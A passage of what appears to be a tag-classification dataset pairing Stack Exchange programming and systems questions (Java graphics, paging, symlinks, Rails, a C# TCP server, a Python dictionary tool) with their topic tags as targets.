ONE_THIRD+ROW_2_HEIGHT);            line[14] = new GLine(0, ONE_THIRD+ROW_2_HEIGHT, ONE_THIRD, ONE_THIRD+ROW_2_HEIGHT);            line[15] = new GLine(ONE_THIRD, ONE_THIRD+ROW_2_HEIGHT, ONE_THIRD*2, ONE_THIRD+ROW_2_HEIGHT);            line[16] = new GLine(ONE_THIRD*2, ONE_THIRD+ROW_2_HEIGHT, ONE_THIRD*3, ONE_THIRD+ROW_2_HEIGHT);            line[17] = new GLine(0, ONE_THIRD+ROW_2_HEIGHT,  0, ONE_THIRD*2+ROW_2_HEIGHT);            line[18] = new GLine(ONE_THIRD, ONE_THIRD+ROW_2_HEIGHT,  ONE_THIRD, ONE_THIRD*2+ROW_2_HEIGHT);            line[19] = new GLine(ONE_THIRD*2, ONE_THIRD+ROW_2_HEIGHT,  ONE_THIRD*2, ONE_THIRD*2+ROW_2_HEIGHT);            line[20] = new GLine(ONE_THIRD*3, ONE_THIRD+ROW_2_HEIGHT, ONE_THIRD*3, ONE_THIRD*2+ROW_2_HEIGHT);            line[21] = new GLine(0,ONE_THIRD*2+ROW_2_HEIGHT, ONE_THIRD, ONE_THIRD*2+ROW_2_HEIGHT);            line[22] = new GLine(ONE_THIRD, ONE_THIRD*2+ROW_2_HEIGHT, ONE_THIRD*2, ONE_THIRD*2+ROW_2_HEIGHT);            line[23] = new GLine(ONE_THIRD*2,ONE_THIRD*2+ROW_2_HEIGHT, ONE_THIRD*3, ONE_THIRD*2+ROW_2_HEIGHT);            for(int i = 0; i<line.length; i++){                add(line[i]);                line[i].setColor(Color.BLACK);                line[i].setVisible(false);            }            arc[0] = new GArc(getWidth(), getHeight(), 106.699, 49.341);            arc[1] = new GArc(getWidth(), getHeight(), 23.96, 49.341);            arc[2] = new GArc(getWidth(), getHeight(), -23.96, -49.341);            arc[3] = new GArc(0,0,getWidth(), getHeight(), -106.699, -49.341);            for(int i = 0; i<arc.length; i++){                add(arc[i],0,0);                arc[i].setColor(Color.BLACK);                arc[i].setVisible(false);            }            paintLetter(s);        }        private void paintLetter(String s){            if (s.equalsIgnoreCase(l)){                turnOn(line[3]);                turnOn(line[10]);                turnOn(line[17]);                turnOn(line[21]);                turnOn(line[22]);                turnOn(line[23]);            }            else if(s.equalsIgnoreCase(o)){                for(int i = 0; i<4; ++i){                    turnOn(arc[i]);                }                turnOn(line[1]);                turnOn(line[10]);                turnOn(line[13]);                turnOn(line[22]);            }        }        private void turnOn(GObject g){            g.setVisible(true);        }    }I created a class (GLetter.java) with arrays for GArc and GLine objects. They are positioned in certain ways thereby turning certain Glines and/or GArcs on or off (changing visiblity) would create a pattern for a letter. This Gletter uses the if/else statements to determine which pattern to create - this makes me feel my code is too long.There is another class (DrawInitials.java) that simulates a GraphicsProgram and allows the user to pass certain letters as arguments to the GLetter object. I've used 'L' and 'O' as examples.However, I posted this because I'm not sure I'm using the right approach. That's why I need your help.I feel MY CODE IS TOO LONG!The code above is not the complete project...it only draws letters 'L' and 'O' for now.",
    "target": "java;api"
  },
  {
    "id": "_cs.11719",
    "source": "Given the logical address, how to extract the page number? <eos> I am studying Computer Systems. I have th following question and its answer:Given the logical address 0xAEF9 (in hexadecimal) with a page size of  256 bytes, what is the page number?Answer: 0xAE (I found this answer in the web, but I want to know how can I  figure it out myself?How can I figure out the page number for a given logical address?",
    "target": "operating systems;memory management;paging;virtual memory"
  },
  {
    "id": "_webmaster.15738",
    "source": "What does the user nobody represent in server process logs <eos> I am new to vps hosting. I checked daily process logs on my server and found a user with name nobody consuming more memory than others.So what is the user nobody related to and why is it consuming more memory?This is the log info I found:  user / cpu / mem / mysql  nobody / 0.00 / 27.31 / 0.0",
    "target": "linux;vps"
  },
  {
    "id": "_unix.101388",
    "source": "Create Relative Symlink Inside Relative Symlink <eos> I've been browsing for a minute now trying to find a way to create a relative symlink inside a relative symlink, and what I mean by that is this...I have my CakePHP Templates Skeleton as a symlink inside one of my projects, inside my skeleton, I have a symlink to a plugin outside the skeleton folder, the idea being, I can symlink my CakePHP CMS Skeleton inside my projects, create an Application plugin outside the CMS skeleton symlink, and and the skeleton symlink point to my projects Application plugin. By that I mean the following. I have a CakePHP CMS Skeleton at the following path/mnt/proj/libs/cakephp/lib/Cake/Console/Templates/skelThe path to my project folder is below/mnt/proj/mysite.com/I then symlink the CakePHP CMS Skeleton inside my project folder like so/mnt/proj/mysite.com/cms-skel -> /mnt/proj/libs/cakephp/lib/Cake/Console/Templates/skelInside the skeleton I have a symlink pointing to an Application plugin/mnt/proj/libs/cakephp/lib/Cake/Console/Templates/skel/Plugin/Application -> ../../ApplicationSo inside the CakePHP CMS symlinked folder in mysite.com folder I have/mnt/proj/mysite.com/cms-skel/Plugin/Application -> ../../ApplicationThe issue is, that the above symlink points to/mnt/proj/libs/cakephp/lib/Cake/Console/Templates/ApplicationAnd I need it to point to /mnt/proj/mysite.com/cms-skel/Plugin/ApplicationAny ideas on how I can do the above with symlinks is greatly appreciate, I am not even sure what to google at this point.",
    "target": "linux;bash;filesystems;symlink"
  },
  {
    "id": "_cs.6506",
    "source": "Some questions regarding compilers and assemblers <eos> Lots of basic questions are there in my mind. I need to clear them.Statement 1: A compiler converts a human-readable codes to object codes, and those are converted to a machine code (executable) by linker.Am I right here?At wikipedia, it is written thatObject files are produced by an assembler, compiler, or other languagetranslator, and used as input to the linker.Question 1: An assembler converts assembly language code (MOV A, B ADD C) to machine code. In case of high-level language like C++, that is generated by linker above. So assembler is not used anywhere. So how can it create an object file as written above? Intermediate code is generated to make the code run on different architectures.Question 2: Are *.class (bytecode) files created by java compiler object files? If yes, then can we say that the JVM that runs them is a type of linker (however its not creating the executable)?Question 3: When we compile a C++ program in Turbo C++, we get *.obj files which are the object files. Can we use them to generate the executable in some other architecture?",
    "target": "terminology;compilers;code generation"
  },
  {
    "id": "_unix.66830",
    "source": "Are there any source APT repositories for Debian Lenny? <eos> Debian Lenny, the current oldstable, ceased receiving security updates early in February, and now seems to no longer be hosted at the usual FTP mirrors (see, e.g., curl http://ftp.nl.debian.org/debian/dists/lenny/ | less).  Are there any surviving FTP repositories of Lenny that can be used via APT?",
    "target": "debian"
  },
  {
    "id": "_webmaster.2042",
    "source": "What is the best implementation of the Facebook like-button you've seen? <eos> I'm looking into implementing the Facebook like-button on my site. Therefore i'm looking for some good examples of the use of the like-button.I'm looking at the placement of the like-button and the use of the Open Graph meta-properties.Please explain why you like a particular implementation",
    "target": "facebook"
  },
  {
    "id": "_cs.72542",
    "source": "Represent a 5 card poker hand <eos> A deck of cards is 52. A hand is 5 cards from the 52 (cannot have a duplicate).  What is the least amount of bits to represent a 5 card hand and how?A hand is NOT order dependent (KQ = QK).  64329 = 96432Yes, can use 52 bits. That can represent a hand of any number of cards.  Given a hand is exactly 5 cards is there a way to represent it with less than 52 bits. A single card can be represented with 6 bits = 64.  So could just use 6 bits * 5 cards = 30 bits.  But that would be order dependent.  I could just sort and this should work. If that would not work please let me know.   Is there a way to get the key to 32 bits or under and not have to sort the 5 card tuple.  This is for poker simulations and sorting would be a lot of overhead compared to just generating the hand.  If I have a dictionary with the relative value of each hand it is two simple lookups and a comparison to compare the value of two hands. If I have to sort the hands first that is large compared to two lookups and a comparison.  In a simulation will compare millions.  I will not get sorted hands from the simulation.  The sort is not simple like 52 51 50 49 48 before  52 51 50 49 47.  You can have straight flush quads ....There are 2598960 possible 5 card hands.  That is the number of rows.  The key is the 5 cards.  I would like to get a key that is 32 bits or under where the the cards do not need to be sorted first.  Cannot just order the list as many hands tie. Suit are spade, club, diamond, and heart.  7c 8c 2d 3d 4s = 7s 8s 2c 3c 4h.  There is a large number of ties.The next step is 64 bits and will take the hit of the sort rather than double the size of the key.  I tested and SortedSet<int> quickSort = new SortedSet<int>() { i, j, k, m, n }; doubles the time of the operation but I still may do it.It gets more complex. I need to be able to represent a boat as twos over fives (22255).  So sorting them breaks that. I know you are going to say but that is fast.  Yes it is fast and trivial but I need as fast as possible.C# for the accepted answer:  private int[] DeckXOR = new int[] {0x00000001,0x00000002,0x00000004,0x00000008,0x00000010,0x00000020,0x00000040,                                    0x00000080,0x00000100,0x00000200,0x00000400,0x00000800,0x00001000,0x00002000,                                    0x00004000,0x00008000,0x00010000,0x00020000,0x00040000,0x00080000,0x00100000,                                    0x00200000,0x00400000,0x00800000,0x01000000,0x02000000,0x04000000,0x07fe0000,                                    0x07c1f000,0x0639cc00,0x01b5aa00,0x056b5600,0x04ed6900,0x039ad500,0x0717c280,                                    0x049b9240,0x00dd0cc0,0x06c823c0,0x07a3ef20,0x002a72e0,0x01191f10,0x02c55870,                                    0x007bbe88,0x05f1b668,0x07a23418,0x0569d998,0x032ade38,0x03cde534,0x060c076a,                                    0x04878b06,0x069b3c05,0x054089a3};public void PokerProB(){    Stopwatch sw = new Stopwatch();    sw.Start();    HashSet<int> cardsXOR = new HashSet<int>();    int cardXOR;    int counter = 0;    for (int i = 51; i >= 4; i--)    {        for (int j = i - 1; j >= 3; j--)        {            for (int k = j - 1; k >= 2; k--)            {                for (int m = k - 1; m >= 1; m--)                {                    for (int n = m - 1; n >= 0; n--)                    {                        counter++;                        cardXOR = DeckXOR[i] ^ DeckXOR[j] ^ DeckXOR[k] ^ DeckXOR[m] ^ DeckXOR[n];                        if (!cardsXOR.Add(cardXOR))                            Debug.WriteLine(problem);                    }                }            }        }    }    sw.Stop();    Debug.WriteLine(Count {0} millisec {1} , counter.ToString(N0), sw.ElapsedMilliseconds.ToString(N0));    Debug.WriteLine();}",
    "target": "combinatorics"
  },
  {
    "id": "_reverseengineering.9126",
    "source": "File reverse engineering - .tbl format <eos> I've been trying to google any information about how can i create a viewer for some custom file formats.In my case I've extracted multiple .tbl files from game sources. This file contains a database table. From what I was able to google, I was able to extract file header. I have tried some tbl-viewers but they say file is corrupted, so i assume that custom encryption presents here.First Bytes of file 1:00000000    46 54 41 42 4c 45 00 00 00 00 10 00 21 00 00 0000000010    03 00 00 00 2c 00 00 00 b0 00 00 00 b4 00 00 0000000020    10 00 00 00 c4 02 00 00 00 00 00 00 01 00 00 0000000030    02 00 00 00 03 00 00 00 04 00 00 00 05 00 00 00First Bytes of file 2:00000000    46 54 41 42 4c 45 00 00 00 00 10 00 22 00 00 0000000010    15 00 00 00 2c 00 00 00 b4 00 00 00 ca 00 00 0000000020    58 00 00 00 7a 0c 00 00 00 00 00 00 01 00 00 0000000030    02 00 00 00 03 00 00 00 04 00 00 00 06 00 00 00So in this case first 12 bytes seem to be the file header46 54 41 42 4c 45 00 00 00 00 10 00which stand for FTABLE......And this is where i am stuck at. I didnt find information on what to do next to achieve my goal",
    "target": "file format;encryption"
  },
  {
    "id": "_softwareengineering.333435",
    "source": "How to control use software hosted on client's computer <eos> TL;DROur app has a Django backend and an Angular 2 frontend; we package it up in Docker. Our client wishes to run this app on their HPC hardware. In return, they pay us a monthly 'subscription'.How can we make sure that the client cannot cancel the contract with us but continue to use the software?More detailWe have made this app that manages simulations and the data from simulations that use an HPC resource. We intend to make this a cloud-based thing but we have a client who wants to use their own hardware.We have a good relationship with them and value their feedback, so we're happy with this arrangement.Our concern is if we try to enter similar agreements with other clients we don't know in the future. We'd probably want to let them trial the software first, but how do we prevent them from running off with it afterwards?We have a Django backend and an Angular 2 frontend. I don't know if that makes a big difference.I understand we can obfuscate the code somewhat. Though, there will always be a way back to the original code. Our bigger concern is that someone can stop paying the bills but continue to use our software.Is there some way we can license the app? I wonder if there is a way to make the code only work if a valid key is provided. These keys would become invalid over time. We would be the only ones who could generate these keys.Oh. And this client's HPC doesn't connect to the internet. So no cloud-based authorisation is going to work, I don't think.Any ideas?",
    "target": "licensing;client relations"
  },
  {
    "id": "_codereview.123950",
    "source": "Asking for GPS and Internet permissions <eos> private void loadTabsIfGPSAndInternetAvailable()    {        final Utils utils = new Utils(this);        final LocationClient locationClient = new LocationClient(this);        if (!utils.isConnected())        {            utils.generateNoConnectivityAlert();        }        else if (!locationClient.hasGPS())        {            utils.generateNoGPSAlert();        }        else        {            if (androidVersion >= Build.VERSION_CODES.M)            {                requestAllPermissions();            }            else            {                loadCameraAndForecastTabs();            }        } // ends else block for if internet and GPS are enabled    }This is some code that loads tabs if the GPS and internet connectivity are available.  I'm aware that at the moment this is very messy code, with lots of nested if statements, that is hard to read, and am not sure how to structure it better.  Can people help me please?",
    "target": "java;android"
  },
  {
    "id": "_unix.283531",
    "source": "linux: Class10 SD card different device and block device size <eos> A have a brand new 16GB class 10 SD card and produce a very strange behavior.After I attached the the card with an USB SD-Card reader, the device appeared as /dev/sdb. I tried to copy a 2GB raw image with dd into, but it's immediately returns: No more space left on device.The block device shows: there is only 10M space on it.ls -lah /dev/sdb-rw-r--r-- 1 root root 10M mj   16 23:16 /dev/sdbfdisk shows the same size:fdisk -l /dev/sdbDisk /dev/sdb: 10 MiB, 10485760 bytes, 20480 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0x84f9d19fI've tried the SD-card with another reader, but looks like it's not a card reader issue, the size of the SD card is 10M with every single reader.cat /proc/partitionsmajor minor  #blocks  name...   8       16   15558144 sdb...The interesting part is: the kernel looks like actually knows the right size of SD card.cat /sys/block/sdb/size31116288  # numbers of 512 byte blocks => 15.93 GBAnd seems like it's properly recognized.May 16 22:58:07 DDSI-Laptop kernel: [258762.883672] usb 1-3: New USB device found, idVendor=14cd, idProduct=125cMay 16 22:58:07 DDSI-Laptop kernel: [258762.883674] usb 1-3: New USB device strings: Mfr=1, Product=3, SerialNumber=2May 16 22:58:07 DDSI-Laptop kernel: [258762.883675] usb 1-3: Product: Mass Storage DeviceMay 16 22:58:07 DDSI-Laptop kernel: [258762.883676] usb 1-3: Manufacturer: GenericMay 16 22:58:07 DDSI-Laptop kernel: [258762.883677] usb 1-3: SerialNumber: 125C20100726May 16 22:58:07 DDSI-Laptop kernel: [258762.883972] usb-storage 1-3:1.0: USB Mass Storage device detectedMay 16 22:58:07 DDSI-Laptop kernel: [258762.884114] scsi host52: usb-storage 1-3:1.0May 16 22:58:07 DDSI-Laptop mtp-probe: checking bus 1, device 30: /sys/devices/pci0000:00/0000:00:14.0/usb1/1-3May 16 22:58:07 DDSI-Laptop mtp-probe: bus: 1, device: 30 was not an MTP deviceMay 16 22:58:08 DDSI-Laptop kernel: [258763.881813] scsi 52:0:0:0: Direct-Access     Mass     Storage Device        PQ: 0 ANSI: 0 CCSMay 16 22:58:08 DDSI-Laptop kernel: [258763.882008] sd 52:0:0:0: Attached scsi generic sg1 type 0May 16 22:58:08 DDSI-Laptop kernel: [258763.883073] sd 52:0:0:0: [sdb] 31116288 512-byte logical blocks: (15.9 GB/14.8 GiB)May 16 22:58:08 DDSI-Laptop kernel: [258763.883195] sd 52:0:0:0: [sdb] Write Protect is offMay 16 22:58:08 DDSI-Laptop kernel: [258763.883198] sd 52:0:0:0: [sdb] Mode Sense: 03 00 00 00May 16 22:58:08 DDSI-Laptop kernel: [258763.883312] sd 52:0:0:0: [sdb] No Caching mode page foundMay 16 22:58:08 DDSI-Laptop kernel: [258763.883315] sd 52:0:0:0: [sdb] Assuming drive cache: write throughWhat cause the difference?",
    "target": "linux;debian;block device;sd card;partition table"
  },
  {
    "id": "_codereview.61080",
    "source": "Controller and view to call multiple instance variables <eos> I have a Rails 3.2.14 app where I have a home controller (dashboard).  In this controller and view I'm calling multiple instance variables to get different counts based off of scopes I've created in the Call and Unit model.  I'd like to see if anyone has any suggestions on how I can DRY this up and query less so the controller/view loads faster. This code is very old and I'm looking for the best way to refactor it.home_controller.rb  def index    @calls = Call.open_status    @all = Call.all    @unit = Unit.active.order(unit_name)    @avail = Unit.active.in_service    @unavail = Unit.active.out_of_service    @unassigned = Call.unassigned_calls    @today = Call.today    @year = Call.year    @previous = Call.previous_year    @assigned = Call.assigned_calls.until_end_of_day    @unassigned = Call.unassigned_calls.until_end_of_day    @scheduled = Call.scheduled_calls  endendcall.rb model scope :open_status, where(call_status: open)  scope :cancel, where(call_status: cancel)  scope :closed, where(call_status: close)  scope :waitreturn, where(wait_return: yes)  scope :wc, lambda { where(service_level_id: ServiceLevel.find_by_level_of_service(WC).id) }  scope :bls, lambda { where(service_level_id: ServiceLevel.find_by_level_of_service(BLS).id) }  scope :als, lambda { where(service_level_id: ServiceLevel.find_by_level_of_service(ALS).id) }  scope :micu, lambda { where(service_level_id: ServiceLevel.find_by_level_of_service(MICU).id) }  scope :cct, lambda { where(service_level_id: ServiceLevel.find_by_level_of_service(CCT).id) }  scope :assist, lambda { where(service_level_id: ServiceLevel.find_by_level_of_service(ASSIST).id) }  scope :em, lambda { where(service_level_id: ServiceLevel.find_by_level_of_service(EM).id) }  scope :by_service_level, lambda { |service_level| where(service_level_id: ServiceLevel.find_by_level_of_service(service_level).id) }  scope :by_region, lambda { |region| where(region_id: Region.find_by_area(region).id) }  scope :from_facility, lambda { |id| where(transfer_from_id: id) }  scope :to_facility, lambda { |id| where(transfer_to_id: id) }  scope :search_between, lambda { |start_date, end_date| where(transfer_date BETWEEN ? AND ?, start_date.beginning_of_day, end_date.end_of_day)}  scope :search_by_start_date,  lambda { |start_date| where('transfer_date BETWEEN ? AND ?', start_date.beginning_of_day, start_date.end_of_day) }  scope :search_by_end_date, lambda { |end_date| where('transfer_date BETWEEN ? AND ?', end_date.beginning_of_day, end_date.end_of_day) }  scope :open_calls, lambda { open_status.includes(:call_units).where([call_units.unit_id IS NOT NULL]) }  scope :unassigned_calls, lambda { open_status.includes(:call_units).where([call_units.unit_id IS NULL]).order(transfer_date ASC) }  scope :assigned_calls, lambda { open_status.includes(:call_units).where([call_units.unit_id IS NOT NULL]).order(transfer_date ASC) }  scope :by_unit_name, lambda {|unit_name| joins(:units).where('units.unit_name = ?', unit_name)}  scope :ambulance, lambda {joins(:units).where('units.vehicle_type = ?', Ambulance)}  scope :wheelchair, lambda {joins(:units).where('units.vehicle_type = ?', Wheelchair)}  scope :scheduled_calls, lambda { open_status.includes(:call_units).where([calls.transfer_date > ?, Time.zone.now.end_of_day]).order(transfer_date ASC) }  scope :medic_calls, lambda { where([call_status = ? and call_units.unit_id IS NOT NULL, open]).order(id ASC) }  scope :today, lambda { where(transfer_date BETWEEN ? AND ?, Time.zone.now.beginning_of_day, Time.zone.now.end_of_day) }  scope :yesterday, lambda { where(transfer_date BETWEEN ? AND ?, 1.day.ago.beginning_of_day, 1.day.ago.end_of_day) }  scope :year, lambda { where(transfer_date BETWEEN ? AND ?, Time.zone.now.beginning_of_year, Time.zone.now.end_of_year) }  scope :previous_year, lambda {where(transfer_date BETWEEN ? AND ?, 1.year.ago.beginning_of_year, 1.year.ago.end_of_year)}  scope :until_end_of_day, lambda { where(transfer_date < ?, Time.zone.now.end_of_day) }unit.rb model  scope :in_service, lambda { where(status_id: Status.where(unit_status: [In Service, At Post, At Station]).map(&:id))}  scope :out_of_service, lambda { where(status_id: Status.find_by_unit_status(Out of Service).id)}  scope :active, where(unit_status: Active)home/index.html.erb<div class=main-area dashboard>    <div class=container>        <div class=row>            <div class=span12>                <div class=slate clearfix>                    <a class=stat-column href=#>                    <span class=number><%= @today.count %></span>                    <span>Today's Calls</span>                    <span class=number><%= @year.count %></span>                    <span>Current YTD Calls</span>                    <span class=number><%= @previous.count %></span>                    <span>Previous YTD Calls</span>                    <span class=number><%= @all.count %></span>                    <span>Calls To Date</span>                    </a>                    <a class=stat-column href=#>                    <span class=number><%= @calls.count %></span>                    <span>Open Calls</span>                    <span class=number><%= @assigned.count %></span>                    <span>Active Calls</span>                    <span class=number><%= @scheduled.count %></span>                    <span>Scheduled Calls</span>                    <span class=number><%= @unassigned.count %></span>                    <span>Unassigned Calls</span>                    </a>                    <a class=stat-column href=#>                    <span class=number><%= @today.ambulance.count %></span>                    <span>Ambulance Calls</span>                    <span class=number><%= @today.wheelchair.count %></span>                    <span>Wheelchair Calls</span>                    <span class=number><%= @avail.count %></span>                    <span>Units In Service</span>                    <span class=number><%= @unavail.count %></span>                    <span>Units Out of Service</span>                    </a>                    <a class=stat-column href=#>                    <span class=number><%= @today.bls.count %></span>                    <span>BLS Calls</span>                    <span class=number><%= @today.als.count %></span>                    <span>ALS Calls</span>                    <span class=number><%= @today.cct.count %></span>                    <span>CCT Calls</span>                    <span class=number><%= @today.micu.count %></span>                    <span>MICU Calls</span>                    </a>                </div>            </div>        </div>        <div class=row>            <div class=span6>                <div class=slate>                    <div class=page-header>                        <h2><i class=icon-signal pull-right></i>Medics</h2>                        </div>                            <table class=table table-striped table-bordered>                                <thead>                                    <tr>                                    <th>Unit</th>                                    <th>Attendant</th>                                    <th>InCharge</th>                                    </tr>                                </thead>                            <tbody>                              <tr>                                <% @unit.each do |unit| %>                                <td><%= unit.try(:unit_name) %></td>                                <td><%= unit.attendant.try(:medic_name) %></td>                                <td><%= unit.incharge.try(:medic_name) %></td>                             </tr>                               <% end %>                            </tbody>                            </table>                    </div>                </div>                <div class=span6>                    <div class=slate>                        <div class=page-header>                            <h2><i class=icon-shopping-cart pull-right></i>Units</h2>                        </div>                            <table class=table table-striped table-bordered>                                <thead>                                    <tr>                                        <th>Unit</th>                                        <th>Status</th>                                    </tr>                                </thead>                                <tbody>                                      <tr>                                        <% @unit.each do |unit| %>                                        <td><%= unit.try(:unit_name) %></td>                                        <td><div class=<%= set_status(unit.status) %>><%= unit.status.try(:unit_status) %></div></td>                                        </tr>                                        <% end %>                                    </tbody>                                </table>                    </div>                </div>            </div>        </div>          </div>",
    "target": "ruby;html;ruby on rails;active record;erb"
  },
  {
    "id": "_softwareengineering.142289",
    "source": "How does one write a book on a new framework? <eos> How are authors able to write a book on a framework that is just released? A framework like spring is updated, and a book is released in the next day. Is this typically by people who are direct contributors? Are they basing it off of beta/alpha versions? I find this rather difficult to understand as that documentation is rarely up to snuff by the time the framework is updated.",
    "target": "books;technical writing"
  },
  {
    "id": "_webapps.86739",
    "source": "How do I send individual links to collect data in Cognito Forms <eos> I want to gather information and pictures from 100 college alumni.  How can I do this in a way where I can send individual links to each alumni member?",
    "target": "cognito forms"
  },
  {
    "id": "_unix.218797",
    "source": "Execute sh with parameters in bash <eos> Hello I am newbie in bash and I am coding a daemon to execute a service. The syntax is ./ctlscript.sh start. When I execute service openproject start it should run this command, but it runs ./ctlscript.sh whitout a parameter and I get the usage. This is my script:#! /bin/sh### BEGIN INIT INFO# Provides: openproject# Required-Start: $remote_fs $syslog# Required-Stop: $remote_fs $syslog# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Openprject# Description: This file starts and stops Openproject server#### END INIT INFOOPENP_DIR=/opt/openprjcase $1 in start)   su administrador -c $OPENP_DIR/ctlscript.sh start   ;; stop)   su administrador -c $OPENP_DIR/ctlscript.sh stop   ;; restart)   su administrador -c $OPENP_DIR/ctlscript.sh stop   sleep 20   su administrador -c $OPENP_DIR/ctlscript.sh start   ;; *)   echo Usage: openproject {start|stop|restart} >&2   exit 3   ;;esacThis is what I get when I run service openproject stop. It is the same when I launch ./ctlscript.sh (without any parameter):usage: /opt/openprj/ctlscript.sh help       /opt/openprj/ctlscript.sh (start|stop|restart|status)       /opt/openprj/ctlscript.sh (start|stop|restart|status) mysql       /opt/openprj/ctlscript.sh (start|stop|restart|status) memcached       /opt/openprj/ctlscript.sh (start|stop|restart|status) apache       /opt/openprj/ctlscript.sh (start|stop|restart|status) subversion       /opt/openprj/ctlscript.sh (start|stop|restart|status) openprojecthelp       - this screenstart      - start the service(s)stop       - stop  the service(s)restart    - restart or start the service(s)status     - show the status of the service(s)Thanks in advance.",
    "target": "bash;shell;daemon"
  },
  {
    "id": "_codereview.72017",
    "source": "TCP Server with multithreading <eos> I am working on a banking application. I want to create a multithreaded TCP Payment Card (iso8583) server that can handle passbook printing requests simultaneously. Multiple devices are connected to the server from different locations.I am going to use below code in my application. Is this thread safe? Can I face any problem in the future if I use this code? All suggestions welcome.class Program    {        static void Main(string[] args)        {            TcpListener serverSocket = new TcpListener(8888);            TcpClient clientSocket = default(TcpClient);            int counter = 0;            serverSocket.Start();            Console.WriteLine( >>  + Server Started);            counter = 0;            while (true)            {                counter += 1;                clientSocket = serverSocket.AcceptTcpClient();                Console.WriteLine( >>  + Client No: + Convert.ToString(counter) +  started!);                handleClinet client = new handleClinet();                client.startClient(clientSocket, Convert.ToString(counter));            }            clientSocket.Close();            serverSocket.Stop();         //   Console.WriteLine( >>  + exit);           Console.ReadLine();        }    }    //Class to handle each client request separatly    public class handleClinet    {        TcpClient clientSocket;        string clNo;        public void startClient(TcpClient inClientSocket, string clineNo)        {            this.clientSocket = inClientSocket;            this.clNo = clineNo;            Thread ctThread = new Thread(doChat);            ctThread.Start();        }        private void doChat()        {            int requestCount = 0;            byte[] bytesFrom = new byte[10025];            string dataFromClient = null;            Byte[] sendBytes = null;            string serverResponse = null;            string rCount = null;            requestCount = 0;            while ((true))            {                try                {                    var respose = ;                    requestCount = requestCount + 1;                    NetworkStream networkStream = clientSocket.GetStream();                    networkStream.Read(bytesFrom, 0, (int)clientSocket.ReceiveBufferSize);                    dataFromClient = System.Text.Encoding.ASCII.GetString(bytesFrom);                  //  dataFromClient = dataFromClient.Substring(0, dataFromClient.IndexOf($));                    Console.WriteLine( >>  + From client- + clNo + dataFromClient);                    try                    {                        var isoPassbookRequestMessage = System.Text.Encoding.ASCII.GetString(bytesFrom);                        WebClient wc = new WebClient();                        NameValueCollection input = new NameValueCollection();                        input.Add(isoPassbookRequest, Convert.ToBase64String(bytesFrom));                        respose = Encoding.ASCII.GetString(wc.UploadValues(http://localhost:52835/Transaction/PassbookTransactionRequest, input));                        try                        {                          //  CommonMethods.AddtoLogFile(PassbookTransactionResponse = Clientid- + clientID +  ProcessingCode -930000 Message - + respose);                          //  atmServer.Send(clientID, Encoding.ASCII.GetBytes(respose));                        }                        catch (SocketException se)                        {                            //could not complete transaction                            //Send reversal to CBS                        }                    }                    catch (Exception e)                    {                    }                    rCount = Convert.ToString(requestCount);                   serverResponse = Server to clinet( + clNo + )  + rCount;                    sendBytes = Encoding.ASCII.GetBytes(respose);                    networkStream.Write(sendBytes, 0, sendBytes.Length);                    networkStream.Flush();                    Console.WriteLine( >>  + serverResponse);                }                catch (Exception ex)                {                    Console.WriteLine( >>  + ex.ToString());                }            }        }    }",
    "target": "c#;multithreading;asynchronous;socket;tcp"
  },
  {
    "id": "_codereview.59867",
    "source": "A simple dictionary tool, extensible with plugins <eos> I'm working on a simple dictionary tool, with a base class that can be extended by plugins to represent different dictionaries. The base class does most of the heavy lifting: it keeps the index of all entries in memory, and it handles searching the index. Plugins that extend this class implement populating the index and loading the entries on demand, handling the specifics of the dictionary backend, such as the formatting of entries.These are the base classes:import abcfrom collections import defaultdictclass BaseEntry(object):    def __init__(self, entry_id, name):        self.entry_id = entry_id        self.name = name    @property    def content(self):        return {            'id': self.entry_id,            'name': self.name,            'content': [],            'references': [],        }    def __repr__(self):        return '%s: %s' % (self.entry_id, self.name)class BaseDictionary(object):    @abc.abstractproperty    def name(self):        return '<The Dictionary>'    @abc.abstractproperty    def is_public(self):        return False    @property    def license(self):        return None    def __init__(self):        self.items_sorted = {}        self.items_by_name = defaultdict(list)        self.items_by_id = {}        self.load_index()    def find(self, word, find_similar=False):        matches = self.items_by_name.get(word)        if matches:            return matches        if find_similar:            return self.find_by_prefix(word, find_similar=True)        return []    def find_by_prefix(self, prefix, find_similar=False):        matches = []        for k in self.items_sorted:            if k.startswith(prefix):                matches.extend(self.items_by_name[k])            elif matches:                break        if find_similar and not matches and len(prefix) > 1:            return self.find_by_prefix(prefix[:-1], find_similar=True)        return matches    def find_by_suffix(self, suffix):        matches = []        for k in self.items_sorted:            if k.endswith(suffix):                matches.extend(self.items_by_name[k])        return matches    def find_by_partial(self, partial):        matches = []        for k in self.items_sorted:            if partial in k:                matches.extend(self.items_by_name[k])        return matches    def get_entry(self, entry_id):        entry = self.items_by_id.get(entry_id)        if entry:            return [entry]        else:            return []    def add(self, entry):        self.items_by_name[entry.name].append(entry)        self.items_by_id[entry.entry_id] = entry    def reindex(self):        self.items_sorted = sorted(self.items_by_name)    @abc.abstractmethod    def load_index(self):                Populate the index. Implement like this:            for entry in entries:                self.add(entry)            self.reindex()        :return:                passThis is an example plugin implementation:import osimport refrom settings import dictionary_pathfrom dictionary.base import BaseDictionary, BaseEntry, lazy_propertyINDEX_PATH = os.path.join(dictionary_path, 'index.dat')re_strong_defs = re.compile(r'(Defn:|Syn\\.)')re_strong_numdots = re.compile(r'(\\d+\\. )')re_strong_alphadots = re.compile(r'(\\([a-z]\\))')re_em_roundbr = re.compile(r'(\\([A-Z][a-z]+\\.\\))')re_em_squarebr = re.compile(r'(\\[[A-Z][a-z]+\\.\\])')def load_entry_content(word, filename):    path = os.path.join(dictionary_path, filename)    if not os.path.isfile(path):        return    with open(path) as fh:        count = 0        content = []        definition_list = []        for line in fh:            # first line contains the term, and ignore next 2 lines            if count < 3:                if count == 0:                    word = line.strip().lower()                count += 1                continue            line = line.strip()            line = line.replace('*', '')            line = re_strong_defs.sub(r'**\\1**', line)            line = re_strong_numdots.sub(r'**\\1** ', line)            line = re_strong_alphadots.sub(r'**\\1**', line)            line = re_em_roundbr.sub(r'*\\1*', line)            line = re_em_squarebr.sub(r'*\\1*', line)            if line:                content.append(line)            else:                definition_list.append(['', ' '.join(content)])                content = []        return {            'id': filename,            'name': word,            'content': definition_list,            'references': []        }    class Dictionary(BaseDictionary):    @property    def name(self):        return 'Webster\\'s Unabridged Dictionary'    @property    def is_public(self):        return True    @property    def license(self):        return         The content of this dictionary is for the use of anyone anywhere        at no cost and with almost no restrictions whatsoever.        You may copy it, give it away or re-use it under the terms 